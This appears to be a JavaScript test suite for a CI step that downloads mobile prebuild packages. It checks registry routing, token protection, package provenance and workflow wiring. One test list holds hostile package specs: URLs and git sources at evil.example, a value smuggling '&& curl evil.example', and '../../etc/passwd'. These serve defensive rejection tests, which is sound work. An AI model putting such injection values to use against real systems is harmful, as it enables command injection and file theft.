// Guards the prebuild-resolution step of
// .github/actions/run-mobile-integration-tests/setup/action.yml.
//
// That step is the ONLY way an unmerged native change reaches a Device Farm
// device: a standalone workflow_dispatch builds no prebuild artifacts, so the
// dispatch `package` / `package_spec` input has to install a branch build from
// GitHub Packages. It used to run a bare `npm pack`, which always resolved
// registry.npmjs.org and therefore 404'd on every @tetherto/* spec while the
// inputs advertised exactly that form. These tests pin the routing so the
// capability cannot silently rot again.
//
// npm is mocked (fixtures/mobile-prebuilds/mock-npm), so nothing here needs a
// network or credentials.
import test from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import {
  chmodSync,
  copyFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '../../..')
const ACTION = '.github/actions/run-mobile-integration-tests/setup/action.yml'
const STEP = 'Download prebuilds (from npm — fallback when no artifacts found)'
const GPR_HOST = 'https://npm.pkg.github.com'
const NPM_HOST = 'https://registry.npmjs.org'

function read(relativePath) {
  return readFileSync(join(root, relativePath), 'utf8')
}

// Pulls the literal shell out of a `run: |` block so the test exercises the
// same text CI executes. Mirrors the helper in ci-trust-policy.test.mjs.
function extractRunBlock(relativePath, stepName) {
  const source = read(relativePath)
  const stepIndex = source.indexOf(`name: ${stepName}`)
  assert.notEqual(stepIndex, -1, `step "${stepName}" exists in ${relativePath}`)

  const remainder = source.slice(stepIndex)
  const runMatch = remainder.match(/^(\s*)run:\s*\|\s*$/m)
  assert.ok(runMatch, `run block exists after "${stepName}" in ${relativePath}`)

  const runStart = stepIndex + runMatch.index + runMatch[0].length + 1
  const contentIndent = runMatch[1].length + 2
  const lines = source.slice(runStart).split('\n')
  const block = []

  for (const line of lines) {
    if (line === '') {
      block.push('')
      continue
    }
    if (line.startsWith(' '.repeat(contentIndent))) {
      block.push(line.slice(contentIndent))
      continue
    }
    break
  }

  return block.join('\n')
}

const script = extractRunBlock(ACTION, STEP)

assert.ok(
  !script.includes('${{'),
  'the step body must stay free of GitHub expressions so it is testable as plain shell',
)

// Runs the step in a throwaway dir standing in for addon/<addon-workdir>.
function runStep({
  packageVersion = '',
  addonName = '@qvac/llm-llamacpp',
  force = 'false',
  token = 'ghs-test-token',
  seedPrebuilds = false,
  ancestorPackageJson = false,
  npmEnv = {},
} = {}) {
  const directory = mkdtempSync(join(tmpdir(), 'qvac-mobile-prebuilds-'))
  const workdir = join(directory, 'addon')
  const runnerTemp = join(directory, 'runner-temp')
  const mockBin = join(directory, 'bin')
  const npmLog = join(directory, 'npm-invocations.log')

  mkdirSync(workdir, { recursive: true })
  mkdirSync(runnerTemp, { recursive: true })
  mkdirSync(mockBin, { recursive: true })
  writeFileSync(npmLog, '')

  const mockNpm = join(mockBin, 'npm')
  copyFileSync(
    join(root, '.github/scripts/test/fixtures/mobile-prebuilds/mock-npm'),
    mockNpm,
  )
  chmodSync(mockNpm, 0o755)

  if (seedPrebuilds) {
    mkdirSync(join(workdir, 'prebuilds/android-arm64'), { recursive: true })
    writeFileSync(join(workdir, 'prebuilds/android-arm64/marker.txt'), 'from-artifact')
  }

  // Puts a package.json ABOVE $RUNNER_TEMP. That is enough to claim npm's
  // localPrefix and make it ignore an .npmrc written further down, which is the
  // shape of runner filesystem that broke @tetherto resolution.
  if (ancestorPackageJson) {
    writeFileSync(
      join(directory, 'package.json'),
      JSON.stringify({ name: 'ancestor', version: '1.0.0' }),
    )
  }

  const result = spawnSync(
    'bash',
    ['--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', script],
    {
      cwd: workdir,
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${mockBin}:${process.env.PATH}`,
        RUNNER_TEMP: runnerTemp,
        ADDON_NPM_NAME: addonName,
        PACKAGE_VERSION: packageVersion,
        FORCE_NPM_PREBUILD: force,
        GPR_TOKEN: token,
        MOCK_NPM_LOG: npmLog,
        ...npmEnv,
      },
    },
  )

  const invocations = readFileSync(npmLog, 'utf8')
  const packDir = join(runnerTemp, 'gpr-prebuild-pack')

  const state = {
    status: result.status,
    output: `${result.stdout}${result.stderr}`,
    invocations,
    packDirExists: existsSync(packDir),
    prebuildsExist: existsSync(join(workdir, 'prebuilds')),
    workdirNpmrcExists: existsSync(join(workdir, '.npmrc')),
    prebuildMarkerSurvived: existsSync(
      join(workdir, 'prebuilds/android-arm64/marker.txt'),
    ),
    androidPrebuildInstalled: existsSync(
      join(workdir, 'prebuilds/android-arm64/addon.bare'),
    ),
    // Sampled by mock-npm while the file still exists — the step deletes it.
    npmrcMode: (invocations.match(/^npmrc_mode=(.+)$/m) || [])[1],
  }

  rmSync(directory, { recursive: true, force: true })
  return state
}

test('a @tetherto spec is resolved from GitHub Packages, with auth', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${GPR_HOST}`),
    `npm should have resolved ${GPR_HOST}, got:\n${run.invocations}`,
  )
  assert.match(run.invocations, /auth=token/)
  assert.match(run.output, /GitHub Packages/)
  assert.ok(run.androidPrebuildInstalled, 'android prebuild landed in prebuilds/')
})

// npm resolves project config at its localPrefix (nearest ancestor owning a
// package.json / node_modules), NOT at cwd. If the pack dir does not own
// localPrefix, the .npmrc is ignored, @tetherto routes back to
// registry.npmjs.org, and the run 404s while still logging "GitHub Packages".
test('GPR routing survives a package.json above $RUNNER_TEMP', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    ancestorPackageJson: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${GPR_HOST}`),
    `an ancestor package.json must not divert resolution:\n${run.invocations}`,
  )
  assert.match(run.invocations, /auth=token/)
  // The pack dir must be the one that owns localPrefix.
  assert.match(run.invocations, /local_prefix=(.*)gpr-prebuild-pack/)
})

test('a @qvac spec still goes to npmjs.org and never to GitHub Packages', () => {
  const run = runStep({
    packageVersion: '@qvac/llm-llamacpp@0.46.0',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.ok(
    run.invocations.includes(`registry=${NPM_HOST}`),
    `npm should have resolved ${NPM_HOST}, got:\n${run.invocations}`,
  )
  assert.match(run.invocations, /npmrc_present=no/)
  assert.doesNotMatch(run.invocations, /npm\.pkg\.github\.com/)
})

test('an empty package-version still resolves <addon>@latest from npmjs.org', () => {
  const run = runStep({ addonName: '@qvac/llm-llamacpp' })

  assert.equal(run.status, 0, run.output)
  assert.match(run.invocations, /spec=@qvac\/llm-llamacpp@latest/)
  assert.ok(
    run.invocations.includes(`registry=${NPM_HOST}`),
    `npm should have resolved ${NPM_HOST}, got:\n${run.invocations}`,
  )
})

test('a @tetherto spec without a token fails before contacting any registry', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    token: '',
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /no token was supplied/)
  assert.match(run.output, /packages: read/)
  assert.equal(run.invocations, '', 'npm must not be invoked without a token')
})

test('a @tetherto spec missing the -mono suffix is called out', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp@0.47.0-tmp.runid-1',
    force: 'true',
  })

  // The suffix is a warning, not a hard failure: a handful of un-suffixed
  // packages still exist, they are just abandoned.
  assert.match(run.output, /::warning::/)
  assert.match(run.output, /-mono/)
})

test('a versionless @tetherto spec keeps its package name intact', () => {
  // "@tetherto/foo-mono" has no version, so stripping at the last '@' would
  // yield "" — a bogus "has no '-mono' suffix" warning and truncated hints.
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.invocations, /spec=@tetherto\/llm-llamacpp-mono$/m)
  assert.doesNotMatch(
    run.output,
    /::warning::/,
    'a name that already ends in -mono must not be warned about',
  )
})

test('a versionless @tetherto spec without -mono still names itself in the hint', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /@tetherto\/llm-llamacpp has no '-mono' suffix/)
  assert.match(run.output, /q=@tetherto\/llm-llamacpp$/m)
})

test('the .npmrc holding the token is not world-readable', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
  })

  assert.equal(run.status, 0, run.output)
  assert.equal(
    run.npmrcMode,
    '600',
    `the token-bearing .npmrc must be 0600, got ${run.npmrcMode}`,
  )
})

// The step holds a GPR credential and several workflows forward a
// workflow_dispatch value straight into package-version. `npm pack` accepts
// non-registry specs (file:, git:, https:, github:, npm: aliases) and a git spec
// would RUN prepare scripts from an arbitrary source. The workflow-level gate is
// prefix-only, so every one of these satisfies it — the action must fail closed.
const HOSTILE_SPECS = [
  '@qvac/llm-llamacpp@file:/tmp/evil.tgz',
  '@tetherto/x-mono@https://evil.example/payload.tgz',
  '@qvac/a@git+ssh://git@evil.example/x.git',
  '@tetherto/a-mono@github:attacker/repo',
  '@qvac/a@npm:other-package@1.0.0',
  '@evil/pkg@1.0.0',
  '@qvac/a@1.0.0 && curl evil.example',
  '../../etc/passwd',
]

for (const spec of HOSTILE_SPECS) {
  test(`rejects a non-registry spec before invoking npm: ${spec}`, () => {
    const run = runStep({ packageVersion: spec, force: 'true' })

    assert.notEqual(run.status, 0, `must fail closed on ${spec}`)
    assert.match(run.output, /Refusing to npm pack/)
    assert.equal(
      run.invocations,
      '',
      `npm must never be invoked for ${spec}`,
    )
    // No .npmrc, so the credential is never written for a rejected spec.
    assert.equal(run.packDirExists, false)
  })
}

// Every shape a real caller actually produces must still pass. The addon name is
// part of the case: the pinned package has to be a build of the addon under test,
// so a spec is only legitimate paired with its own workflow.
const LEGITIMATE_SPECS = [
  ['@qvac/llm-llamacpp', '@qvac/llm-llamacpp@0.46.0'],
  ['@qvac/llm-llamacpp', '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-33179656677'],
  ['@qvac/llm-llamacpp', '@tetherto/llm-llamacpp-mono@0.47.0-tmp.pr-3938.runid-33179656677'],
  ['@qvac/llm-llamacpp', '@qvac/llm-llamacpp@latest'],
  ['@qvac/transcription-parakeet', '@qvac/transcription-parakeet@1.0.0'],
]

for (const [addonName, spec] of LEGITIMATE_SPECS) {
  test(`accepts the real caller spec: ${spec}`, () => {
    const run = runStep({ addonName, packageVersion: spec, force: 'true' })
    assert.equal(run.status, 0, run.output)
    assert.doesNotMatch(run.output, /Refusing to npm pack/)
  })
}

test('accepts a bare dist-tag and an unscoped addon name', () => {
  // inference-addon-cpp passes an UNSCOPED addon-npm-name and no package input,
  // so its fallback spec is "inference-addon-cpp-mobile-tests@latest".
  const unscoped = runStep({ addonName: 'inference-addon-cpp-mobile-tests' })
  assert.equal(unscoped.status, 0, unscoped.output)
  assert.match(unscoped.invocations, /spec=inference-addon-cpp-mobile-tests@latest/)

  // Whisper/TTS-style callers wire a bare version through package-version.
  const bare = runStep({ packageVersion: '1.4.0', force: 'true', npmEnv: { MOCK_NPM_VERSION: '1.4.0' } })
  assert.equal(bare.status, 0, bare.output)
  assert.match(bare.invocations, /spec=@qvac\/llm-llamacpp@1\.4\.0/)
})

// Ian's scenario: pinning ANOTHER addon's package in this workflow used to exit
// 0, drop that addon's .bare into this addon's prebuilds/ and continue to a
// device, printing "Verified:" with the wrong name. Only the version was ever
// compared; the packed name was read and printed but never asserted.
test('rejects a package that is not a build of the addon under test', () => {
  const run = runStep({
    addonName: '@qvac/llm-llamacpp',
    packageVersion: '@tetherto/embed-llamacpp-mono@1.2.3',
    force: 'true',
    npmEnv: { MOCK_NPM_VERSION: '1.2.3' },
  })

  assert.notEqual(run.status, 0, 'must not accept another addon\'s package')
  assert.match(run.output, /is not a build of @qvac\/llm-llamacpp/)
  assert.equal(
    run.androidPrebuildInstalled,
    false,
    "the wrong addon's prebuild must not land in prebuilds/",
  )
})

test('accepts the @qvac name against its @tetherto -mono counterpart', () => {
  // The main flow: workflow tests @qvac/vla-ggml, pin is @tetherto/vla-ggml-mono.
  const run = runStep({
    addonName: '@qvac/vla-ggml',
    packageVersion: '@tetherto/vla-ggml-mono@0.23.0',
    force: 'true',
    npmEnv: { MOCK_NPM_VERSION: '0.23.0' },
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /Verified: prebuilds come from @tetherto\/vla-ggml-mono@0\.23\.0/)
})

test('rejects a registry that returns a different package than requested', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_NAME: '@tetherto/llm-llamacpp-mono-evil' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /resolved to .* but the spec named/)
})

test('a dist-tag resolve still asserts the name and reports the version', () => {
  // Previously this branch printed "skipping … assertion" and asserted nothing.
  const run = runStep({
    packageVersion: '@qvac/llm-llamacpp@latest',
    force: 'true',
    npmEnv: { MOCK_NPM_VERSION: '0.47.0' },
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /Verified: prebuilds come from @qvac\/llm-llamacpp@0\.47\.0/)
  assert.match(run.output, /dist-tag\/range so the exact version is not asserted/)
})

test('fails closed when the GPR .npmrc is not in effect', () => {
  // Belt-and-braces on the localPrefix trap: the action asks npm where
  // @tetherto resolves rather than assuming it from the scope, so a shadowed
  // .npmrc becomes a clear error instead of a 404 mislabelled "GitHub Packages".
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_IGNORE_NPMRC: '1' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /is resolving to .*, not GitHub Packages/)
  assert.match(run.output, /localPrefix/)
})

test('a failed @tetherto resolve points at GitHub Packages, not npmjs.com', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.0.0-nope',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /github\.com\/orgs\/tetherto\/packages/)
  assert.match(run.output, /tmp\.runid-/)
  assert.doesNotMatch(
    run.output,
    /www\.npmjs\.com/,
    'a GPR failure must not send the reader to npmjs.com',
  )
})

test('the token never lands in the addon checkout that gets bundled', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    token: 'ghs-secret-value',
  })

  assert.equal(run.status, 0, run.output)
  assert.equal(run.workdirNpmrcExists, false, 'no .npmrc left in the addon workdir')
  assert.equal(run.packDirExists, false, 'the pack dir (holding the .npmrc) is removed')
  assert.doesNotMatch(run.output, /ghs-secret-value/)
})

test('the pack dir is cleaned up even when the download fails', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.0.0-nope',
    force: 'true',
    npmEnv: { MOCK_NPM_FAIL_WITH: '404' },
  })

  assert.notEqual(run.status, 0)
  assert.equal(run.packDirExists, false)
})

test('artifact-first precedence is unchanged: artifacts win, npm is skipped', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'false',
    seedPrebuilds: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /skipping npm fallback/)
  assert.equal(run.invocations, '', 'npm must not run when artifacts are present')
  assert.ok(run.prebuildMarkerSurvived, 'the artifact prebuild is left in place')
})

test('force-npm-prebuild discards artifacts so a pin cannot be shadowed', () => {
  // QVAC-21879: a benchmark baseline session once measured the candidate binary
  // because an artifact shadowed the pinned version.
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    seedPrebuilds: true,
  })

  assert.equal(run.status, 0, run.output)
  assert.match(run.output, /discarding pre-existing prebuilds/)
  assert.equal(run.prebuildMarkerSurvived, false, 'the shadowing artifact is gone')
  assert.ok(run.androidPrebuildInstalled, 'the pinned package supplied the prebuild')
})

test('provenance mismatch fails instead of testing the wrong binary', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_VERSION: '0.1.0' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /but package-version pins/)
})

test('a package without prebuilds/ is rejected', () => {
  const run = runStep({
    packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
    force: 'true',
    npmEnv: { MOCK_NPM_NO_PREBUILDS: '1' },
  })

  assert.notEqual(run.status, 0)
  assert.match(run.output, /No prebuilds directory found/)
})

// Every mobile addon routes through this one step, so a change here can break an
// addon nobody thought to test. Read each workflow's REAL addon-npm-name and
// exercise the step for all of them, rather than spot-checking llm-llamacpp.
function mobileAddons() {
  const files = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  ).stdout.trim().split('\n').filter(Boolean)

  const addons = []
  for (const relativePath of files) {
    const source = read(relativePath)
    const match = source.match(/addon-npm-name:\s*'([^']+)'/)
    if (!match) continue
    addons.push({
      workflow: relativePath.replace(/.*integration-mobile-test-|\.yml$/g, ''),
      npmName: match[1],
      skipsPrebuilds: /skip-prebuilds:\s*'true'/.test(source),
    })
  }
  return addons
}

const MOBILE_ADDONS = mobileAddons()

test('every mobile addon was discovered', () => {
  assert.ok(MOBILE_ADDONS.length >= 13, `found ${MOBILE_ADDONS.length}`)
})

for (const addon of MOBILE_ADDONS) {
  // decoder-audio passes skip-prebuilds:'true', so this step never runs for it.
  if (addon.skipsPrebuilds) continue

  const bare = addon.npmName.replace(/^@qvac\//, '')

  // A full published spec, except for the one addon whose name is UNSCOPED
  // (inference-addon-cpp). The action's spec-form detection only recognises
  // SCOPED full specs (`@*/*`), so an unscoped `name@version` would be
  // double-prefixed into `name@name@version`. That path is unreachable — that
  // workflow exposes no `package` input, so its package-version is always empty
  // — and the spec validator now rejects the malformed result loudly instead of
  // handing nonsense to npm. Pass a bare version for it, which is the form its
  // callers could actually produce.
  const publishedSpec = addon.npmName.startsWith('@')
    ? `${addon.npmName}@1.2.3`
    : '1.2.3'

  test(`${addon.workflow}: published spec still resolves`, () => {
    const run = runStep({
      addonName: addon.npmName,
      packageVersion: publishedSpec,
      force: 'true',
      npmEnv: { MOCK_NPM_VERSION: '1.2.3' },
    })
    assert.equal(run.status, 0, run.output)
    assert.ok(run.invocations.includes(`registry=${NPM_HOST}`), run.invocations)
    assert.ok(run.androidPrebuildInstalled)
  })

  test(`${addon.workflow}: GPR -mono dev spec resolves`, () => {
    const run = runStep({
      addonName: addon.npmName,
      packageVersion: `@tetherto/${bare}-mono@1.2.3-tmp.runid-42`,
      force: 'true',
      npmEnv: { MOCK_NPM_VERSION: '1.2.3-tmp.runid-42' },
    })
    assert.equal(run.status, 0, run.output)
    assert.ok(run.invocations.includes(`registry=${GPR_HOST}`), run.invocations)
    assert.match(run.invocations, /auth=token/)
    assert.ok(run.androidPrebuildInstalled)
  })

  test(`${addon.workflow}: empty package-version resolves its own @latest`, () => {
    const run = runStep({ addonName: addon.npmName })
    assert.equal(run.status, 0, run.output)
    // Plain containment, not a built regex: the addon name is interpolated from
    // a workflow file, and hand-escaping it for RegExp is how the earlier
    // incomplete-escaping alerts happened. There is nothing to match here.
    assert.ok(
      run.invocations.includes(`spec=${addon.npmName}@latest`),
      `expected spec=${addon.npmName}@latest in:\n${run.invocations}`,
    )
  })

  test(`${addon.workflow}: another addon's package is rejected`, () => {
    const other = bare === 'llm-llamacpp' ? 'ocr-ggml' : 'llm-llamacpp'
    const run = runStep({
      addonName: addon.npmName,
      packageVersion: `@tetherto/${other}-mono@1.2.3`,
      force: 'true',
      npmEnv: { MOCK_NPM_VERSION: '1.2.3' },
    })
    assert.notEqual(run.status, 0, `${addon.workflow} accepted ${other}`)
    assert.match(run.output, /is not a build of/)
  })
}

// The dispatch inputs are what people copy from. They advertise the @tetherto
// form, so the advertised name must be the one publish-library-to-gpr actually
// publishes (`name-suffix: "-mono"`).
test('every mobile dispatch input advertises the -mono GPR name', () => {
  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  )
    .stdout.trim()
    .split('\n')
    .filter(Boolean)

  assert.ok(workflows.length >= 13, `found ${workflows.length} mobile workflows`)

  const offenders = []
  for (const relativePath of workflows) {
    // Any @tetherto/<name>@ spec whose name lacks the -mono suffix.
    for (const match of read(relativePath).matchAll(/@tetherto\/[a-z0-9-]+?(?<!-mono)@/g)) {
      offenders.push(`${relativePath}: ${match[0]}`)
    }
  }

  assert.deepEqual(
    offenders,
    [],
    `GPR dev builds are published as @tetherto/<addon>-mono:\n${offenders.join('\n')}`,
  )
})

// ── prebuild_run_id ─────────────────────────────────────────────────────────
// Resolution logic is unit-tested in
// .github/actions/run-mobile-integration-tests/setup/test/resolve-prebuild-run.test.mjs.
// Asserted HERE is the wiring: the route is only as good as the weakest workflow
// that forgot a piece of it, and a source not gated on the run id would shadow
// it silently.

// Without the gate a run id could resolve and then be overwritten, or fall
// through to `npm pack @qvac/<addon>@latest` and go green against the release.
test('every other prebuild source is gated off when a run id is set', () => {
  const source = read(ACTION)
  const gated = [
    'Download Android prebuilds (from artifacts)',
    'Download iOS prebuilds (from artifacts)',
    'Download merged prebuilds artifact (fallback when per-matrix artifacts absent)',
    STEP,
  ]

  for (const stepName of gated) {
    const index = source.indexOf(`name: ${stepName}`)
    assert.notEqual(index, -1, `step "${stepName}" exists`)
    const condition = source.slice(index).match(/^\s*if:\s*(.+)$/m)?.[1] ?? ''
    assert.ok(
      condition.includes("inputs.prebuild-run-id == ''"),
      `"${stepName}" must be skipped while prebuild-run-id is set, got: ${condition}`,
    )
  }
})

test('the run-id steps are the first prebuild source and fail closed', () => {
  const source = read(ACTION)

  const resolveIndex = source.indexOf('name: Resolve prebuilds from a run id')
  const downloadIndex = source.indexOf("name: Download prebuilds (from the resolved run)")
  const verifyIndex = source.indexOf("name: Verify the resolved run's prebuilds cover this platform")
  const androidIndex = source.indexOf('name: Download Android prebuilds (from artifacts)')

  assert.ok(resolveIndex !== -1 && downloadIndex !== -1 && verifyIndex !== -1)
  // Resolution happens before anything is downloaded, so a bad run id costs
  // nothing, and before the artifact-first steps so it cannot be shadowed.
  assert.ok(
    resolveIndex < downloadIndex && downloadIndex < verifyIndex && verifyIndex < androidIndex,
    'order must be resolve -> download -> verify -> (gated) artifact-first steps',
  )

  // continue-on-error on the cross-run download would turn a missing artifact
  // back into an @latest run. The other artifact downloads tolerate absence by
  // design; this one must not.
  const downloadStep = source.slice(downloadIndex, androidIndex)
  assert.doesNotMatch(
    downloadStep,
    /continue-on-error/,
    'a named run id is an explicit instruction — a failed download must fail the run',
  )
  assert.match(downloadStep, /run-id: \$\{\{ steps\.prebuild_run\.outputs\.source_run_id \}\}/)
  // By ID, not name: a re-run leaves the earlier attempt's artifacts under the
  // same run id, so a run can hold two live `prebuilds-<pkg>` rows. Selecting
  // by name would let this step extract a different one than the resolver
  // validated and printed provenance for.
  assert.match(downloadStep, /artifact-ids: \$\{\{ steps\.prebuild_run\.outputs\.artifact_id \}\}/)
  assert.doesNotMatch(
    downloadStep,
    /^\s+name: /m,
    'selecting by name would reintroduce the ambiguity artifact_id removes',
  )
})

// Every mobile workflow sparse-checks out only
// .github/actions/run-mobile-integration-tests, so a move would leave the step
// calling a file that is not on disk — visible only at dispatch time.
test('the resolver is reachable from the callers own sparse checkout', () => {
  const resolver = '.github/actions/run-mobile-integration-tests/setup/resolve-prebuild-run.mjs'
  assert.ok(existsSync(join(root, resolver)), `${resolver} must exist`)
  assert.match(
    read(ACTION),
    /node "\$ACTION_PATH\/resolve-prebuild-run\.mjs"/,
    'the step must invoke the resolver through github.action_path',
  )

  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  ).stdout.trim().split('\n').filter(Boolean)

  for (const relativePath of workflows) {
    const source = read(relativePath)
    if (!source.includes('prebuild-run-id:')) continue
    assert.match(
      source,
      /sparse-checkout: \|\n\s+\.github\/actions\/run-mobile-integration-tests/,
      `${relativePath} must sparse-check out the directory holding the resolver`,
    )
  }
})

// Two addons deliberately have no run-id route. Pinning them means a third
// exclusion has to be a decision, not a silent omission.
const RUN_ID_EXEMPT = {
  // Native code comes transitively from bare-ffmpeg, so setup skips every
  // prebuild step (skip-prebuilds: 'true') and has nothing to install.
  'decoder-audio': /skip-prebuilds:\s*'true'/,
  // Compiles its own prebuilds in prebuild-android / prebuild-ios jobs in the
  // SAME run from the dispatched ref, so a dispatch already tests the branch's
  // native code and the gap this route closes does not exist.
  'inference-addon-cpp': /^\s{2}prebuild-android:$/m,
}

test('every mobile dispatch offers the run-id route, or is a pinned exemption', () => {
  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  ).stdout.trim().split('\n').filter(Boolean)

  assert.ok(workflows.length >= 13, `found ${workflows.length} mobile workflows`)

  const missing = []
  for (const relativePath of workflows) {
    const slug = relativePath.replace(/.*integration-mobile-test-|\.yml$/g, '')
    const source = read(relativePath)

    if (slug in RUN_ID_EXEMPT) {
      assert.match(
        source,
        RUN_ID_EXEMPT[slug],
        `${slug} is exempt from the run-id route for a reason that no longer holds`,
      )
      assert.ok(
        !source.includes('prebuild_run_id'),
        `${slug} is listed as exempt but now exposes prebuild_run_id — drop the exemption`,
      )
      continue
    }

    const problems = []
    if (!/^      prebuild_run_id:$/m.test(source)) problems.push('no prebuild_run_id input')
    if (!source.includes('prebuild-run-id: ${{ inputs.prebuild_run_id }}')) {
      problems.push('input not wired into setup')
    }
    // Without actions: read the lookup 403s and the download fails — after the
    // dispatcher has already waited for a build.
    if (!/^      actions: read$/m.test(source)) problems.push('no actions: read')
    if (problems.length > 0) missing.push(`${slug}: ${problems.join(', ')}`)
  }

  assert.deepEqual(missing, [], `incomplete prebuild_run_id wiring:\n${missing.join('\n')}`)
})

test('ggml-rpc-server skips same-run prebuilds for a pinned run and verifies the source', () => {
  const source = read('.github/workflows/integration-mobile-test-ggml-rpc-server.yml')
  assert.match(source, /prebuild-manual:\n\s+if: inputs\.platform != '' && inputs\.prebuild_run_id == ''/)
  assert.match(source, /prebuild-run-id: \$\{\{ inputs\.prebuild_run_id \}\}/)
  assert.match(source, /RESOLVED: \$\{\{ steps\.setup\.outputs\.prebuild-source-run-id \}\}/)
})

// The dispatch inputs are what people copy from, and the action rejects the
// combination, so the descriptions must say so.
test('the run-id input documents its precedence and the mutual exclusion', () => {
  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  ).stdout.trim().split('\n').filter(Boolean)

  for (const relativePath of workflows) {
    const source = read(relativePath)
    const match = source.match(/^      prebuild_run_id:\n        description: "([^"]*)"/m)
    if (!match) continue

    const description = match[1]
    assert.match(description, /Mutually exclusive/, `${relativePath} must state the exclusion`)
    assert.match(description, /precedence over/, `${relativePath} must state the precedence`)
    assert.match(
      description,
      /fails the run/,
      `${relativePath} must say a bad run id fails rather than falling back`,
    )
  }
})

test('the documented route is the one docs/ci/MOBILE-ON-DEMAND.md tells people to use', () => {
  const docs = read('docs/ci/MOBILE-ON-DEMAND.md')
  assert.match(docs, /prebuild_run_id/, 'the docs must document the input')
  const rpcDispatch = docs.split('### ggml-rpc-server dispatch\n')[1]?.split('### Quick start')[0]
  assert.ok(rpcDispatch, 'the ggml-rpc-server dispatch example must exist')
  assert.match(rpcDispatch, /--ref main -f ref="refs\/pull\/\$PR\/head"/,
    'fork PRs must dispatch an upstream workflow that checks out the PR head')
  // The GPR pin stays documented for the cross-branch / published cases.
  assert.match(docs, /@tetherto\/<addon>-mono/)
})

// The generic "Verify and prepare prebuilds" step only asserts prebuilds/ is
// non-empty, which a bundle missing this platform passes. Run the real shell.
const VERIFY_STEP = "Verify the resolved run's prebuilds cover this platform"
const verifyScript = extractRunBlock(ACTION, VERIFY_STEP)

assert.ok(
  !verifyScript.includes('${{'),
  'the verify step body must stay free of GitHub expressions so it is testable as plain shell',
)

function runVerify({ dirs = ['android-arm64'], expected = 'android-arm64', platform = 'Android' } = {}) {
  const directory = mkdtempSync(join(tmpdir(), 'qvac-prebuild-run-verify-'))

  for (const dir of dirs) {
    mkdirSync(join(directory, 'prebuilds', dir), { recursive: true })
    writeFileSync(join(directory, 'prebuilds', dir, 'addon.bare'), 'mock')
  }

  const result = spawnSync(
    'bash',
    ['--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', verifyScript],
    {
      cwd: directory,
      encoding: 'utf8',
      env: {
        ...process.env,
        EXPECTED_DIRS: expected,
        SOURCE_RUN_ID: '33179656677',
        SOURCE_HEAD_SHA: 'deadbeefcafe',
        SOURCE_ARTIFACT: 'prebuilds-llm-llamacpp',
        PLATFORM: platform,
      },
    },
  )

  rmSync(directory, { recursive: true, force: true })
  return { status: result.status, output: `${result.stdout}${result.stderr}` }
}

test('the resolved bundle passes when it carries this platform, and says where it came from', () => {
  const run = runVerify({ dirs: ['android-arm64', 'ios-arm64'] })

